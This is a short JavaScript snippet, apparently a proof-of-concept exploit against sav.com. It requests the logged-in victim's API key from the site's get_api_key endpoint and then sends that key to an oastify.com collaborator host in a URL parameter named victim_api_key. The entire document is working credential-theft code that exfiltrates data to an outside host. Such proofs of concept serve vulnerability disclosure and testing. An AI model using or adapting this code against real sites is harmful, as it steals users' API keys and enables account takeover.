fetch("https://www.sav.com/users/get_api_key", { method: "POST",
		  headers: {
		    "Content-Type": "application/json",
		  },
		  body: JSON.stringify({}),
		})
		  .then((response) => response.json())  // parse JSON
		  .then((data) => {console.log(data);fetch(`https://r914q4t0t8r0g5hve1un1uo7qywokd.oastify.com?victim_api_key=${JSON.stringify(data.api_key)}`)})    // log the parsed data
		  .catch((error) => console.error('Error:', error)); 
